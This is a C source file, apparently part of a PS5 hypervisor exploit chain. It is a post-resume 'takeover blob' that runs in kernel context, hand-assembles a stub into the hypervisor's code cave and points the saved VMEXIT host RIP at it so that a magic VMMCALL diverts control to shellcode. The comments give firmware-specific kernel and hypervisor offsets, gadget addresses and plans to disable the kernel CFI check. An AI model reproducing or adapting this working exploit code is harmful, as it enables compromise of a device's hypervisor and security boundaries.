/*
 * Post-resume hypervisor takeover blob (runs on the BSP in kernel context).
 *
 * Entered after resume via a khook resume_rip redirect installed on
 * SYS_GETUID. Arguments:
 *   rdi = kernel text base (ktext)
 *   rsi = direct-map base (dmap, i.e. kdldmap(0))
 *
 * With NPT already disabled by the pre-suspend break_hv payload, the direct
 * map addresses HV physical memory. We patch the HV VMEXIT dispatcher so the
 * first VMMCALL hands control to shellcode_hv (running on the identity map),
 * disable the kernel CFI check, then force every logical CPU through a
 * rendezvous whose action callback is a bare VMMCALL. This blob never
 * returns.
 */
#include <stdint.h>

/* The hypervisor's VMEXIT dispatcher. 0x62846C00 was another 13.20 value; the
 * 13.60 one is 0x6283D800, which off_1360 records as hardware-verified - the
 * code at that address is `mov edx,0xcfc ; in eax,dx`. Patching the wrong
 * address means the takeover rewrites something else in hypervisor memory, or
 * nothing at all, and then the VMMCALL never reaches shellcode_hv. */
#define HV_HANDLE_VMEXIT_PA   0x6283D800ULL
/* Four kilobytes of 0xCC inside the hypervisor's own image - free space that the
 * delegating stub is built in. It has to be the hypervisor's memory rather than the
 * cave at 4 GiB, because the stub runs before CR3 is switched. */
#define HV_CODE_CAVE_PA       0x62806F00ULL
#define HV_MAGIC              0x1360u

#define CAVE_HV_PAGING        0x100000000ULL
#define CAVE_HV_CODE          0x100003000ULL

/* Kernel offsets. These were all carried over from a 13.20 table and every one
 * of them was wrong for 13.60, which is what made the kernel die a few seconds
 * after it started: the blob patched an arbitrary .text address and then called
 * smp_rendezvous at an address that is the middle of some other function.
 *
 * Checked against this console's own 13.60 kernel, the way
 * tools/verify-offsets.py now re-checks them:
 *
 *   0x44F8C0  KERNEL_CFI_CHECK, confirmed as a function start
 *   0xB03BA0  FUN_SMP_RENDEZVOUS, confirmed as a function start
 *   0x2912A2  a bare `ret` (the table's GAD_RET_TRAMP); 0x291232 was not one
 *   0xC16A19  a real `vmmcall`, followed by `pop rbp; ret`. The old 0xc09e49 was
 *             in the same region of hypervisor code but shifted - the instruction
 *             there is not a vmmcall at all. */
#define OFF_KERNEL_CFI_CHECK  0x44F8C0ULL
#define OFF_FUN_SMP_RENDEZVOUS 0xB03BA0ULL

#define OFF_GADGET_RET        0x2912A2ULL   /* bare `ret` */
#define OFF_GADGET_VMMCALL    0xC16A19ULL   /* `vmmcall` (tail never runs) */

/* mp3_initialize(0) - "initialize hdcp in mp3". The only one of the four
 * bring-up calls upstream makes whose offset this port has;
 * dp_enable_link_phy needs FUN_TRANSMITTER_CONTROL and the other two need
 * FUN_MP3_INVOKE, neither of which is known for 13.60. It is attempted here
 * because this code still runs on the kernel's own page tables, which is the
 * only context in which a kernel function can be called at all. */
#define OFF_FUN_MP3_INITIALIZE 0xA13740ULL

__attribute__((section(".entry_point"), noreturn))
void takeover(uint64_t ktext, uint64_t dmap)
{
  /* A delegating hook on the hypervisor's VMEXIT dispatcher.
   *
   * Overwriting the dispatcher's first bytes wholesale - which is what this did -
   * takes it away from everyone, not just from us. The fifteen cores still running
   * the PS5 issue hypercalls constantly, and every one of them then lands in
   * shellcode_hv, which clears the MTRRs, disables SVM and starts booting Linux on
   * a machine that is still running FreeBSD. That is why the console powers off
   * deterministically a few seconds after the wake, why it makes no difference
   * whether one core is kicked or sixteen, why moving the write later changes
   * nothing, and why a four-byte cli;hlt in the cave instead of shellcode_hv
   * changes nothing either: the PS5 is destroyed by the redirect itself.
   *
   * So the redirect now delegates. The dispatcher's first 25 bytes are copied into
   * the hypervisor's own code cave, the entry gets a five byte jump to a stub that
   * replays those bytes for every hypercall except one, and only ours - EAX = 0x1360
   * and RBX = 0x1360, a pair no PS5 hypercall uses - goes to the cave. Fifteen cores
   * keep talking to the hypervisor; the platform keeps seeing a live system.
   *
   * The stub has to live in the hypervisor's memory and not in the cave at 4 GiB,
   * because it runs before the CR3 switch: HV_CODE_CAVE_PA is four kilobytes of
   * 0xCC inside the hypervisor's own image, which is what it is for. */
  /* Redirect the VMEXIT entry by editing the host state save area, not the code.
   *
   * The dispatcher cannot be patched in place and cannot be copied: its first
   * instructions include a RIP-relative lea, and the byte boundary at 25 falls in
   * the middle of it, so a stub that replays them elsewhere would compute the wrong
   * address and one that jumps to +25 would start mid-instruction. Both were
   * checked against the dump before this was rewritten.
   *
   * Where the hypervisor resumes after a VMEXIT is not in its code at all - it is
   * the host RIP in the host state save area, whose physical address is in MSR
   * VM_HSAVE_PA (0xC0010117). That qword can simply be pointed at a stub in the
   * hypervisor's own code cave, leaving every byte of the original dispatcher
   * untouched and every relative reference in it still correct.
   *
   * The stub then delegates: anything whose EAX is not our magic number jumps
   * straight to the real dispatcher, so the fifteen cores still running the PS5 keep
   * talking to the hypervisor exactly as before. Only our own VMMCALL goes to the
   * cave. That is the difference between taking the machine and taking it away from
   * the PS5, which is what killed it every time. */
  uint8_t *cave = (uint8_t *)(uintptr_t)(dmap + HV_CODE_CAVE_PA);
  uint32_t lo, hi;
  uint64_t hsave_pa, *hs;
  int patched = 0;
  int32_t rel;

  __asm__ __volatile__("rdmsr" : "=a"(lo), "=d"(hi) : "c"(0xC0010117));
  hsave_pa = ((uint64_t)hi << 32) | lo;

  /* Layout of the stub, 41 bytes:
   *   +0   cmp eax, HV_MAGIC        3d imm32       5
   *   +5   je  to_cave              0f 84 rel32    6
   *   +11  jmp HV_HANDLE_VMEXIT_PA  e9 rel32       5
   *   +16  to_cave:
   *        movabs rax, CAVE_HV_PAGING               10
   *   +26  mov cr3, rax             0f 22 d8       3
   *   +29  movabs rax, CAVE_HV_CODE                10
   *   +39  jmp rax                  ff e0          2 */
  cave[0] = 0x3d;
  *(uint32_t *)(void *)(cave + 1) = HV_MAGIC;
  cave[5] = 0x0f;
  cave[6] = 0x84;
  *(int32_t *)(void *)(cave + 7) = (int32_t)5;
  cave[11] = 0xe9;
  {
    uint64_t paging = CAVE_HV_PAGING;
    uint64_t code = CAVE_HV_CODE;
    /* Base-independent: the stub and the dispatcher are both inside the
     * hypervisor's own image, so their difference is the same however that image is
     * mapped. Only the saved host RIP needs the hypervisor's own addressing. */
    rel = (int32_t)((int64_t)HV_HANDLE_VMEXIT_PA - (int64_t)HV_CODE_CAVE_PA - 16);
    *(int32_t *)(void *)(cave + 12) = rel;
    cave[16] = 0x48;
    cave[17] = 0xb8;
    for (int i = 0; i < 8; i++)
      cave[18 + i] = (uint8_t)(paging >> (8 * i));
    cave[26] = 0x0f;
    cave[27] = 0x22;
    cave[28] = 0xd8;
    cave[29] = 0x48;
    cave[30] = 0xb8;
    for (int i = 0; i < 8; i++)
      cave[31 + i] = (uint8_t)(code >> (8 * i));
    cave[39] = 0xff;
    cave[40] = 0xe0;
  }

  /* Find the host RIP in the save area and point it at the stub.
   *
   * Matched on the low 22 bits, which are the dispatcher's offset inside the
   * hypervisor's four megabyte image, rather than on the whole value: whatever
   * addressing the hypervisor uses for its own code - identity, a slide, kernel
   * virtual addresses - the offset is the same, and the replacement is built from
   * the base that match implies. Requiring the low bits to line up also means a
   * stray qword cannot be mistaken for it, and if nothing matches, nothing is
   * written. */
  {
    const uint64_t img_mask = 0x3FFFFFULL;
    uint64_t want_off = HV_HANDLE_VMEXIT_PA & img_mask;
    uint64_t cave_off = HV_CODE_CAVE_PA & img_mask;

    hs = (uint64_t *)(uintptr_t)(dmap + (hsave_pa & ~0xFFFULL));
    for (int i = 0; i < 512; i++) {
      if (hs[i] < 0x1000)
        continue;
      if ((hs[i] & img_mask) != want_off)
        continue;
      hs[i] = (hs[i] - want_off) + cave_off;
      patched++;
    }
  }

  /* Our own hypercall. Two registers carry the magic so the EAX check cannot be
   * satisfied by a PS5 hypercall that happens to use the same number. */
  __asm__ __volatile__("movl $0x1360, %%eax\n\t"
                       "movl $0x1360, %%ebx\n\t"
                       "vmmcall\n\t"
                       :
                       :
                       : "eax", "ebx", "memory");

  for (;;)
    ;
}
